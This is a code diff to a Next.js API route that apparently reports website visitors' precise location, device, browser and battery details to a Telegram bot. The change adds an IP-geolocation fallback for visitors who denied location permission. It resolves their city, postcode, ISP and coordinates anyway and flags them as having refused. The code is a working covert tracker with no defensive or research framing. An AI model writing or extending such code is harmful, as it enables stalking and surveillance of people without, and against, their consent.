@@ -47,12 +47,24 @@ async function reverseGeocode(lat: number, lng: number) {
   }
 }
 
+async function ipGeolocate(ip: string) {
+  if (!ip || ip === "unknown" || ip === "127.0.0.1" || ip === "::1") return null;
+  try {
+    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
+    const data = await res.json();
+    if (data.status === "success") return data;
+    return null;
+  } catch {
+    return null;
+  }
+}
+
 export async function POST(req: NextRequest) {
   const body = await req.json();
   const {
     latitude, longitude, accuracy,
     altitude, altitudeAccuracy, heading, speed,
-    timestamp, browserInfo = {},
+    timestamp, browserInfo = {}, fallback = false,
   } = body;
 
   const token = process.env.TG_BOT_TOKEN;
@@ -66,42 +78,68 @@ export async function POST(req: NextRequest) {
   const device = parseDevice(ua);
   const browser = parseBrowser(ua);
   const os = parseOS(ua);
-  const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-  const geo = await reverseGeocode(latitude, longitude);
-  const addr = geo?.address || {};
-
-  const locationParts = [
-    addr.road,
-    addr.house_number ? `#${addr.house_number}` : null,
-    addr.neighbourhood || addr.suburb,
-    addr.city || addr.town || addr.village,
-    addr.state,
-    addr.postcode,
-    addr.country,
-  ].filter(Boolean);
 
   const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim()
     || req.headers.get("x-real-ip")
     || "unknown";
 
+  const ipGeo = fallback ? await ipGeolocate(ip) : null;
+
+  const lat = latitude ?? ipGeo?.lat;
+  const lng = longitude ?? ipGeo?.lon;
+  const mapsLink = lat && lng ? `https://www.google.com/maps?q=${lat},${lng}` : null;
+
+  let locationParts: string[] = [];
+  if (!fallback && lat && lng) {
+    const geo = await reverseGeocode(lat, lng);
+    const addr = geo?.address || {};
+    locationParts = [
+      addr.road,
+      addr.house_number ? `#${addr.house_number}` : null,
+      addr.neighbourhood || addr.suburb,
+      addr.city || addr.town || addr.village,
+      addr.state,
+      addr.postcode,
+      addr.country,
+    ].filter(Boolean) as string[];
+  } else if (ipGeo) {
+    locationParts = [
+      ipGeo.city,
+      ipGeo.regionName,
+      ipGeo.zip,
+      ipGeo.country,
+    ].filter(Boolean);
+  }
+
   const lines: string[] = [
-    `📍 *${device}* shared their location`,
+    fallback
+      ? `📍 *${device}* visited _(denied permission, IP fallback)_`
+      : `📍 *${device}* shared their location`,
     ``,
     `*📌 Address*`,
     locationParts.length > 0 ? locationParts.join(", ") : "Could not resolve address",
     ``,
-    `*🗺 Coordinates*`,
-    `Lat: \`${latitude}\``,
-    `Lng: \`${longitude}\``,
-    `Accuracy: \`${Math.round(accuracy)}m\``,
   ];
 
-  if (altitude != null) lines.push(`Altitude: \`${Math.round(altitude)}m\``);
-  if (altitudeAccuracy != null) lines.push(`Alt Accuracy: \`${Math.round(altitudeAccuracy)}m\``);
-  if (heading != null) lines.push(`Heading: \`${heading}°\``);
-  if (speed != null) lines.push(`Speed: \`${speed} m/s\``);
-  if (timestamp) lines.push(`Timestamp: \`${new Date(timestamp).toISOString()}\``);
+  if (!fallback) {
+    lines.push(`*🗺 Coordinates*`);
+    lines.push(`Lat: \`${lat}\``);
+    lines.push(`Lng: \`${lng}\``);
+    if (accuracy != null) lines.push(`Accuracy: \`${Math.round(accuracy)}m\``);
+    if (altitude != null) lines.push(`Altitude: \`${Math.round(altitude)}m\``);
+    if (altitudeAccuracy != null) lines.push(`Alt Accuracy: \`${Math.round(altitudeAccuracy)}m\``);
+    if (heading != null) lines.push(`Heading: \`${heading}°\``);
+    if (speed != null) lines.push(`Speed: \`${speed} m/s\``);
+    if (timestamp) lines.push(`Timestamp: \`${new Date(timestamp).toISOString()}\``);
+  } else if (ipGeo) {
+    lines.push(`*🗺 IP Location (approx)*`);
+    lines.push(`Lat: \`${ipGeo.lat}\``);
+    lines.push(`Lng: \`${ipGeo.lon}\``);
+    lines.push(`ISP: \`${ipGeo.isp}\``);
+    lines.push(`Org: \`${ipGeo.org}\``);
+    lines.push(`AS: \`${ipGeo.as}\``);
+    lines.push(`Timezone: \`${ipGeo.timezone}\``);
+  }
 
   lines.push(``);
   lines.push(`*📱 Device & Browser*`);
@@ -143,7 +181,7 @@ export async function POST(req: NextRequest) {
   if (browserInfo.batteryCharging) lines.push(`Charging: \`${browserInfo.batteryCharging}\``);
 
   lines.push(``);
-  lines.push(`[📍 View on Google Maps](${mapsLink})`);
+  if (mapsLink) lines.push(`[📍 View on Google Maps](${mapsLink})`);
 
   const text = lines.join("\n");
 
